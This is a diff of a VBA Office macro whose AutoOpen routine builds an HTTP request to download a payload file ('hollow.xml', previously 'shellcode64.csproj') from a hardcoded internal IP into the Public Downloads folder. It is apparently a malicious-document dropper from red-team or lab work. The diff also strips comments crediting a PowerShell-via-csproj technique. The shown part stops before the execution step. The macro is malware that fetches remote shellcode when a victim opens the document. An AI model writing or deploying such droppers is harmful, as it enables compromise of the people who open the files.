@@ -1,9 +1,3 @@
-' based on
-' https://stackoverflow.com/questions/17877389/how-do-i-download-a-file-using-vba-without-internet-explorer
-'
-' powashell.csproj by @SubTee
-' https://gist.github.com/egre55/7a6b6018c9c5ae88c63bdb23879df4d0
-
 Sub AutoOpen()
     Dim WinHttpReq As Object
     Dim oStream As Object
@@ -11,7 +5,7 @@ Sub AutoOpen()
     Dim LocalFilePath As String
     Dim ExecFile As Double
 
-    myURL = "http://192.168.50.145/shellcode64.csproj"
+    myURL = "http://192.168.50.145/hollow.xml"
     LocalFilePath = "C:\Users\Public\Downloads\hollow.xml"
     
     ' Create the HTTP request object
